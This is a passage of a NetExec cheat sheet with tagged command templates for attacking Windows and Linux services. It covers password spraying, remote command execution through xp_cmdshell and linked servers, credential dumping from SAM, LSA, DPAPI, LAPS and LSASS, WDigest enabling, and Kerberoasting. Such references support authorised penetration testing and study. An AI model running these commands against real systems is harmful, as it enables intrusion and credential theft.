nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o USER=<username> USER_ID=<uid>
```

## nxc - RaiseChild with encryption type
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o ETYPE=<encryption_type>
```

## nxc - RaiseChild with RID
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> -u <user> -p '<password>' -M raisechild -o RID=<rid>
```

## nxc - use Kerberos cache after RaiseChild
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/PRIVESC
```bash
nxc ldap <ip> --use-kcache
```

### Entra ID / Azure AD

## nxc - enumerate Entra ID
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M entra-id
```

### SCCM

## nxc - enumerate SCCM via LDAP
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' -M sccm -o REC_RESOLVE=TRUE
```

### Password Settings Objects

## nxc - dump Fine-Grained Password Policies
#platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
netexec ldap <ip> -u <user> -p '<password>' --pso
```

---

## MSSQL Protocol

### Authentication

## nxc - MSSQL Windows authentication
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>'
```

## nxc - MSSQL Windows auth with domain
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' -d <domain>
```

## nxc - MSSQL local authentication
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth
```

## nxc - MSSQL with custom port
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/AUTH
```bash
nxc mssql <ip> -u <user> -p '<password>' --port <port>
```

### Password Spraying

## nxc - MSSQL password spray
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/BRUTEFORCE
```bash
nxc mssql <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute MSSQL query
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -q '<query>'
```

## nxc - execute Windows command via xp_cmdshell
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' --local-auth -x <command>
```

### File Operations

## nxc - upload file via MSSQL
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/FILE
```bash
nxc mssql <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file via MSSQL
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/FILE
```bash
nxc mssql <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```

### Enumeration

## nxc - enumerate MSSQL users by RID bruteforce
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>' --rid-brute
```

### Linked Servers

## nxc - enumerate linked servers
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>' -M enum_links
```

## nxc - execute on linked server
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M exec_on_link -o LINKED_SERVER=<server> COMMAND='<command>'
```

## nxc - enable xp_cmdshell on linked server
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_enable_cmdshell -o LINKED_SERVER=<server> ACTION=enable
```

## nxc - execute command on linked server
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_xpcmd -o LINKED_SERVER=<server> CMD='<command>'
```

## nxc - disable xp_cmdshell on linked server
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/EXECUTION
```bash
nxc mssql <ip> -u <user> -p '<password>' -M link_enable_cmdshell -o LINKED_SERVER=<server> ACTION=disable
```

### Privilege Escalation

## nxc - check MSSQL privileges
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/RECON
```bash
nxc mssql <ip> -u <user> -p '<password>'
```

## nxc - enumerate MSSQL privilege escalation paths
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv
```

## nxc - perform MSSQL privilege escalation
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv -o ACTION=privesc
```

## nxc - rollback MSSQL privilege escalation
#platform/windows #target/remote #port/1433 #protocol/mssql #cat/PRIVESC
```bash
nxc mssql <ip> -u <user> -p '<password>' -M mssql_priv -o ACTION=rollback
```

---

## WinRM Protocol

### Authentication

## nxc - WinRM authentication
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/AUTH
```bash
nxc winrm <ip> -u <user> -p '<password>'
```

## nxc - WinRM auth with domain
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/AUTH
```bash
nxc winrm <ip> -u <user> -p '<password>' -d <domain>
```

### Password Spraying

## nxc - WinRM password spray
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/BRUTEFORCE
```bash
nxc winrm <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute PowerShell via WinRM
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/EXECUTION
```bash
nxc winrm <ip> -u <user> -p '<password>' -X <command>
```

### Credential Dumping

## nxc - dump SAM via WinRM
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --sam
```

## nxc - dump LSA via WinRM
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --lsa
```

## nxc - dump DPAPI via WinRM
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --dpapi
```

### LAPS

## nxc - read LAPS via WinRM
#platform/windows #target/remote #port/5985 #port/5986 #protocol/winrm #cat/CREDENTIALS
```bash
nxc winrm <ip> -u <user> -p '<password>' --laps
```

---

## WMI Protocol

### Authentication

## nxc - WMI Windows authentication
#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>'
```

## nxc - WMI auth with domain
#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>' -d <domain>
```

## nxc - WMI local authentication
#platform/windows #target/remote #port/135 #protocol/wmi #cat/AUTH
```bash
nxc wmi <ip> -u <user> -p '<password>' --local-auth
```

### Password Spraying

## nxc - WMI password spray
#platform/windows #target/remote #port/135 #protocol/wmi #cat/BRUTEFORCE
```bash
nxc wmi <ip> -u <userfile> -p <passwordfile>
```

## nxc - WMI password spray without bruteforce
#platform/windows #target/remote #port/135 #protocol/wmi #cat/BRUTEFORCE
```bash
nxc wmi <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute command via WMI
#platform/windows #target/remote #port/135 #protocol/wmi #cat/EXECUTION
```bash
nxc wmi <ip> -u <user> -p '<password>' -x <command>
```

---

## SSH Protocol

### Authentication

## nxc - SSH authentication
#platform/linux #target/remote #port/22 #protocol/ssh #cat/AUTH
```bash
nxc ssh <ip> -u <user> -p '<password>'
```

## nxc - SSH with custom port
#platform/linux #target/remote #port/22 #protocol/ssh #cat/AUTH
```bash
nxc ssh <ip> --port <port> -u <user> -p '<password>'
```

### Password Spraying

## nxc - SSH password spray
#platform/linux #target/remote #port/22 #protocol/ssh #cat/BRUTEFORCE
```bash
nxc ssh <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Command Execution

## nxc - execute command via SSH
#platform/linux #target/remote #port/22 #protocol/ssh #cat/EXECUTION
```bash
nxc ssh <ip> -u <user> -p '<password>' -x <command>
```

### File Operations

## nxc - upload file via SSH
#platform/linux #target/remote #port/22 #protocol/ssh #cat/FILE
```bash
nxc ssh <ip> -u <user> -p '<password>' --put-file <local_file> <remote_file>
```

## nxc - download file via SSH
#platform/linux #target/remote #port/22 #protocol/ssh #cat/FILE
```bash
nxc ssh <ip> -u <user> -p '<password>' --get-file <remote_file> <local_file>
```

---

## FTP Protocol

### Password Spraying

## nxc - FTP password spray
#platform/any #target/remote #port/21 #protocol/ftp #cat/BRUTEFORCE
```bash
nxc ftp <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### File Operations

## nxc - list FTP directory
#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls
```

## nxc - list specific FTP directory
#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls <directory>
```

## nxc - download file via FTP
#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --get <filename>
```

## nxc - upload file via FTP
#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --put <local_file> <remote_file>
```

---

## RDP Protocol

### Password Spraying

## nxc - RDP password spray
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/BRUTEFORCE
```bash
nxc rdp <ip> -u <user> -p '<password>'
```

## nxc - RDP password spray without bruteforce
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/BRUTEFORCE
```bash
nxc rdp <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

### Screenshots

## nxc - screenshot without NLA
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/RECON
```bash
nxc rdp <ip> --nla-screenshot
```

## nxc - screenshot when connected
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/RECON
```bash
nxc rdp <ip> -u <user> -p '<password>' --screenshot --screentime <seconds>
```

### Command Execution

## nxc - execute command via RDP (Beta)
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
```bash
netexec rdp <ip> -u <user> -p '<password>' -x <command>
```

## nxc - execute via RDP with custom delays
#platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
```bash
netexec rdp <ip> -u <user> -p '<password>' -x <command> --cmd-delay <seconds> --clipboard-delay <seconds>
```

---

## NFS Protocol

### Enumeration

## nxc - enumerate NFS servers
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip>
```

## nxc - enumerate NFS shares
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --shares
```

## nxc - list files on NFS share
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --share <share_path> --ls <directory>
```

## nxc - list files on root filesystem
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --ls /
```

## nxc - enumerate files recursively
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares
```

## nxc - enumerate with custom depth
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares <depth>
```

### File Operations

## nxc - download file with share specified
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --share <share_path> --get-file <remote_file> <local_file>
```

## nxc - download file without share
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --get-file <remote_file> <local_file>
```

## nxc - upload file with share specified
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --share <share_path> --put-file <local_file> <remote_file>
```

## nxc - upload file without share
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/FILE
```bash
nxc nfs <ip> --put-file <local_file> <remote_file>
```

---

## General Options

### Target Formats

## nxc - target single hostname
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <hostname>
```

## nxc - target single IP
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip>
```

## nxc - target multiple IPs
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip1> <ip2> <ip3>
```

## nxc - target CIDR range
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip>/24
```

## nxc - target IP range
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <start_ip>-<end_ip>
```

## nxc - target from file
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <target_file>
```

### Credential Options

## nxc - use credential ID from database
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -id <cred_id>
```

## nxc - credentials with special characters
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <user> -p '<password>'
```

## nxc - credentials starting with dash
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u='-<username>' -p='-<password>'
```

## nxc - continue on success
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <userfile> -p <passwordfile> --continue-on-success
```

## nxc - no bruteforce mode
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

## nxc - jitter delay fixed
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> --jitter <seconds> -u <userfile> -p <passwordfile>
```

## nxc - jitter delay range
#platform/any #target/remote #protocol/any #cat/AUTH
```bash
nxc <protocol> <ip> --jitter <min>-<max> -u <userfile> -p <passwordfile>
```

### Kerberos Options

## nxc - use Kerberos authentication
#platform/windows #target/remote #protocol/ldap #cat/KERBEROS
```bash
nxc ldap <hostname> -k --kdcHost <dc_hostname>
```

### Certificate Authentication

## nxc - authenticate with PFX certificate
#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-cert <cert_file> -u <user>
```

## nxc - PFX with password
#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-cert <cert_file> --pfx-pass <password> -u <user>
```

## nxc - authenticate with base64 PFX
#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pfx-base64 <base64_cert> -u <user>
```

## nxc - authenticate with PEM certificate
#platform/windows #target/remote #protocol/smb #cat/AUTH
```bash
nxc smb <ip> --pem-cert <cert_file> --pem-key <key_file> -u <user>
```

### DNS Options

## nxc - custom DNS server
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-server <dns_ip>
```

## nxc - DNS timeout
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-timeout <seconds>
```

## nxc - use TCP for DNS
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --dns-tcp
```

## nxc - enforce IPv6
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -6
```

### Module Usage

## nxc - list available modules
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> -L
```

## nxc - use single module
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module_name>
```

## nxc - show module options
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> -M <module_name> --options
```

## nxc - use module with options
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module> -o <option>=<value>
```

## nxc - use multiple modules
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' -M <module1> -M <module2> -M <module3>
```

### Database

## nxc - initialize database
#platform/any #target/local #cat/USAGE
```bash
nxcdb
```

### Logging

## nxc - log to file
#platform/any #target/remote #protocol/any #cat/USAGE
```bash
nxc <protocol> <ip> -u <user> -p '<password>' --log <logfile>
```

---

## Additional SMB Commands

## nxc - enumerate active sessions
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --sessions
```

## nxc - enumerate local groups
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --local-groups
```

## nxc - enumerate domain groups via SMB
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' --groups
```

## nxc - enable WDigest
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --wdigest enable
```

## nxc - disable WDigest
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' --local-auth --wdigest disable
```

## nxc - query user sessions
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
```bash
nxc smb <ip> -u <user> -p '<password>' -x 'quser'
```

## nxc - logoff user session
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> -u <user> -p '<password>' -x 'logoff <session_id>' --no-output
```

## nxc - Kerberos authentication with password
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <hostname> -u <user> -p '<password>' -k
```

## nxc - Kerberos authentication with ticket cache
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
export KRB5CCNAME=<ticket.ccache>
nxc smb <hostname> --use-kcache
```

## nxc - Kerberos execute command with ticket
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <hostname> --use-kcache -x <command>
```

## nxc - password spray user equals password
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <ip> -u <userfile> -p <userfile> --no-bruteforce --continue-on-success
```

## nxc - password spray multiple attempts
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK
```bash
nxc smb <ip> -u <userfile> -p <passwordfile> --continue-on-success
```

## nxc - dump LSASS with BloodHound update
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT
```bash
nxc smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<neo4j_user> NEO4JPASS=<neo4j_pass>
```

## nxc - DPAPI dump credentials
#platform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/CREDENTIALS
```bash
nxc smb <ip> -u <user> -p '<password>' --dpapi
```

---

## Additional LDAP Commands

## nxc - ASREPRoast without authentication
#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '' --asreproast <output_file> --kdcHost <dc_ip>
```

## nxc - Kerberoast with kdcHost
#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --kerberoasting <output_file> --kdcHost <dc_ip>
```

## nxc - enumerate unconstrained delegation
#platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
```bash
nxc ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```

---

## Additional MSSQL Commands

## nxc - MSSQL password spray no bruteforce
#platform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK
```bash
nxc mssql <ip> -u <userfile> -p <passwordfile> --no-bruteforce
```

---

## Additional FTP Commands

## nxc - FTP list directory
#platform/any #target/remote #port/21 #protocol/ftp #cat/RECON
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls
```

## nxc - FTP list and download file
#platform/any #target/remote #port/21 #protocol/ftp #cat/FILE
```bash
nxc ftp <ip> -u <user> -p '<password>' --ls <directory> --get <filename>
```

---

## Additional NFS Commands

## nxc - enumerate NFS servers
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip>
```

## nxc - enumerate NFS shares
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --shares
```

## nxc - list files on NFS share
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --share '<share_path>' --ls '<directory>'
```

## nxc - enumerate NFS files recursively
#platform/linux #target/remote #port/2049 #protocol/nfs #cat/RECON
```bash
nxc nfs <ip> --enum-shares
```